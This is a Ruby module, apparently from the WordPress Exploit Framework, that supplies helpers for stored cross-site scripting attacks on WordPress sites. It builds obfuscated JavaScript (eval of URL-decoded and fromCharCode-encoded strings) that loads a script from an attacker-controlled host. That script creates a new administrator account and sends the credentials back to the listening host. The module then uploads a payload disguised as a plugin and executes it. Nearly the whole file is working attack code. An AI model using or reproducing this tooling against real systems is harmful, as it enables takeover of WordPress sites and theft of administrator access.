# frozen_string_literal: true

require 'erb'

# Provides helper methods for generating scripts for XSS attacks.
module Wpxf::WordPress::Xss
  include Wpxf
  include Wpxf::Net::HttpServer
  include Wpxf::WordPress::Plugin
  include ERB::Util

  # Initialize a new instance of {Xss}.
  def initialize
    super
    @success = false
    @info[:desc] = 'This module stores a script which will be executed when '\
                   'an admin user visits the vulnerable page. Execution of the script '\
                   'will create a new admin user which will be used to upload '\
                   'and execute the selected payload in the context of the '\
                   'web server.'

    register_options([
      StringOption.new(
        name: 'xss_host',
        desc: 'The address of the host listening for a connection',
        required: true
      ),
      StringOption.new(
        name: 'xss_path',
        desc: 'The path to access via the cross-site request',
        default: Utility::Text.rand_alpha(8),
        required: true
      )
    ])
  end

  # @return [String] the address of the host listening for a conneciton.
  def xss_host
    normalized_option_value('xss_host')
  end

  # @return [String] the path to make cross-site requests to.
  def xss_path
    normalized_option_value('xss_path')
  end

  # @return [String] the full URL to make cross-site requests to.
  def xss_url
    "http://#{xss_host}:#{http_server_bind_port}/#{xss_path}"
  end

  # @return [String] a script that includes the user creation JavaScript.
  def xss_include_script
    script = [
      'var a = document.createElement("script");',
      "a.setAttribute(\"src\", \"#{xss_url}\");",
      'document.head.appendChild(a);'
    ].join

    "eval(decodeURIComponent(/#{url_encode(script)}/.source))"
  end

  # @return [String] a script that includes the user creation JavaScript
  #   without any spaces or quotation marks in the script that may be
  #   escaped by the likes of magic-quotes.
  def xss_ascii_encoded_include_script
    "eval(String.fromCharCode(#{xss_include_script.bytes.join(',')}))"
  end

  # @return [String] the URL encoded value of #xss_ascii_encoded_include_script.
  def xss_url_and_ascii_encoded_include_script
    url_encode(xss_ascii_encoded_include_script)
  end

  # @return [String] a script that will create a new admin user and post the
  #   credentials back to {#xss_url}.
  def wordpress_js_create_user
    variables = {
      '$wordpress_url_new_user' => wordpress_url_new_user,
      '$username' => Utility::Text.rand_alpha(6),
      '$password' => "#{Utility::Text.rand_alphanumeric(10)}!",
      '$email' => "#{Utility::Text.rand_alpha(7)}@#{Utility::Text.rand_alpha(10)}.com",
      '$xss_url' => xss_url
    }

    %(
      #{js_ajax_download}
      #{js_ajax_post}
      #{read_js_file_with_vars('create_wp_user.js', variables)}
    )
  end

  # Default HTTP request handler for XSS modules which will serve the script
  # required to create new administrator users and upload a payload shell.
  # @param path [String] the path requested.
  # @param params [Hash] the query string parameters.
  # @param headers [Hash] the HTTP headers.
  # @return [String] the response body to send to the client.
  def on_http_request(path, params, headers)
    if params['u'] && params['p']
      emit_success "Created a new administrator user, #{params['u']}:#{params['p']}"
      stop_http_server

      # Set this for #run to pick up to determine success state
      @success = upload_shell(params['u'], params['p'])

      return ''
    else
      emit_info 'Incoming request received, serving JavaScript...'
      return wordpress_js_create_user
    end
  end

  # Upload the selected payload as a WordPress plugin.
  # @param username [String] the username to authenticate with.
  # @param password [String] the password to authenticate with.
  # @return [Boolean] true if successful.
  def upload_shell(username, password)
    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    plugin_name = Utility::Text.rand_alpha(10)
    payload_name = Utility::Text.rand_alpha(10)

    emit_info 'Uploading payload...'
    unless upload_payload_as_plugin(plugin_name, payload_name, cookie)
      emit_error 'Failed to upload the payload'
      return false
    end

    execute_payload(plugin_name, payload_name)

    true
  end

  # @return [Boolean] true if the XSS shell upload was successful.
  def xss_shell_success
    @success
  end

  private

  def execute_payload(plugin_name, payload_name)
    payload_url = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    emit_info "Executing the payload at #{payload_url}..."
    res = execute_get_request(url: payload_url)
    emit_success "Result: #{res.body}" if res && res.code == 200 && !res.body.strip.empty?
  end

  def read_js_file_with_vars(name, vars)
    matcher = /#{vars.keys.map { |k| Regexp.escape(k) }.join('|')}/
    File.read(File.join(Wpxf.data_directory, 'js', name)).gsub(matcher, vars)
  end
end
